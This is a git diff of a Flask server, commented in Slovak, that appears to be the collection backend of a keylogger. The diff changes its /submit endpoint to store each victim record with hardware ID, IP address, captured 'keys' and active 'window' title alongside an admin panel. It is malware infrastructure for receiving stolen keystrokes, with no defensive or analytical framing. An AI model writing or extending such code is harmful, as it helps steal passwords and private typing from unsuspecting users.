@@ -13,8 +13,18 @@ def home():
 def submit():
     json_data = request.json
     print("Received data:", json_data)  # log pre debug
-    json_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-    DATA.append(json_data)
+    
+    # vytvorenie správnej štruktúry dát na uloženie
+    entry = {
+        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
+        'user_id': json_data.get('user_id', 'N/A'),
+        'hwid': json_data.get('hwid', 'N/A'),
+        'ip_address': json_data.get('ip_address', 'N/A'),
+        'keys': json_data.get('keys', 'N/A'),
+        'window': json_data.get('window', 'N/A')
+    }
+    DATA.append(entry)
+    
     return {"status": "received"}
 
 @app.route('/admin', methods=['GET', 'POST'])
@@ -32,6 +42,7 @@ def logout():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
+
 
 
 
